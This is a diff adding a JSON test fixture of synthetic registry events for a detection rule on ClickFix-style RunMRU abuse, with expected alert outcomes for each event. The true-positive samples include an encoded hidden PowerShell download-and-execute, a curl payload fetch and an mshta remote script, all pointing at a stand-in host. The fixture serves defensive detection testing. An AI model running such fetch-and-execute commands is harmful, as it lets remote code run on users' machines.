@@ -1,0 +1,67 @@
+{
+  "rule": "T1204.004_clickfix_runmru_runtime_loader",
+  "table": "DeviceRegistryEvents",
+  "note": "Synthetic events. Device names, accounts and hosts are fabricated.",
+  "events": [
+    {
+      "_id": "tp_encoded_powershell",
+      "Timestamp": "2026-09-01T09:14:22Z",
+      "ActionType": "RegistryValueSet",
+      "DeviceName": "lab-win11-01",
+      "DeviceId": "d0000000000000000000000000000001",
+      "InitiatingProcessAccountUpn": "alice@lab.example",
+      "RegistryKey": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
+      "RegistryValueName": "a",
+      "RegistryValueData": "powershell -w hidden -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBmAGEAawBlAC4AaQBuAHYAYQBsAGkAZAAvAGEALgBwAHMAMQAnACkA\\1",
+      "_expected": { "fires": true, "severity": "High", "score": 130 }
+    },
+    {
+      "_id": "tp_curl_deno",
+      "Timestamp": "2026-09-01T11:02:07Z",
+      "ActionType": "RegistryValueSet",
+      "DeviceName": "lab-win11-02",
+      "DeviceId": "d0000000000000000000000000000002",
+      "InitiatingProcessAccountUpn": "bob@lab.example",
+      "RegistryKey": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
+      "RegistryValueName": "b",
+      "RegistryValueData": "cmd /c curl -Lo %tmp%\\d.zip https://fake.invalid/runtime.zip && tar -xf %tmp%\\d.zip -C %localappdata%\\mainapp\\1",
+      "_expected": { "fires": true, "severity": "High", "score": 90 }
+    },
+    {
+      "_id": "tp_mshta_remote",
+      "Timestamp": "2026-09-01T14:47:51Z",
+      "ActionType": "RegistryValueSet",
+      "DeviceName": "lab-win11-03",
+      "DeviceId": "d0000000000000000000000000000003",
+      "InitiatingProcessAccountUpn": "carol@lab.example",
+      "RegistryKey": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
+      "RegistryValueName": "c",
+      "RegistryValueData": "mshta https://fake.invalid/verify.hta\\1",
+      "_expected": { "fires": true, "severity": "High", "score": 90 }
+    },
+    {
+      "_id": "fp_admin_gpupdate",
+      "Timestamp": "2026-09-01T08:03:12Z",
+      "ActionType": "RegistryValueSet",
+      "DeviceName": "lab-win11-04",
+      "DeviceId": "d0000000000000000000000000000004",
+      "InitiatingProcessAccountUpn": "svc-admin@lab.example",
+      "RegistryKey": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
+      "RegistryValueName": "d",
+      "RegistryValueData": "cmd /c gpupdate /force\\1",
+      "_expected": { "fires": true, "severity": "Low", "score": 40 }
+    },
+    {
+      "_id": "fn_benign_notepad",
+      "Timestamp": "2026-09-01T10:20:00Z",
+      "ActionType": "RegistryValueSet",
+      "DeviceName": "lab-win11-05",
+      "DeviceId": "d0000000000000000000000000000005",
+      "InitiatingProcessAccountUpn": "dave@lab.example",
+      "RegistryKey": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
+      "RegistryValueName": "e",
+      "RegistryValueData": "notepad\\1",
+      "_expected": { "fires": false }
+    }
+  ]
+}
